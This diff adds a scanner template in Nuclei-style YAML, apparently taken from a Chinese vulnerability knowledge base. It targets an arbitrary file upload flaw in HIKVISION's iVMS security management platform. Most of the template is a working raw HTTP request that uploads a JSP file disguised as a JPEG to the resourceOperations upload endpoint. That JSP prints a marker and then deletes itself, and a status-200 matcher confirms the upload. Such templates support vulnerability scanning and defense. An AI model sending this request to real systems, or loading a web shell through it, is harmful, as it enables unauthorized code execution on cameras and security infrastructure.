@@ -1,0 +1,65 @@
+id: poc-ph9cle2nl01x00vy
+info:
+  name: HIKVISION iVMS综合安防管理平台 resourceOperations 任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ph9cle2nl01x00vy'
+  tags: rce,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ph9cle2nl01x00vy
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /eps/api/resourceOperations/upload?token=Token HTTP/1.1
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+
+
+    Content-Disposition: form-data; name="fileUploader"; filename="test.jsp"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    <%out.print("hello world");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+
+    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
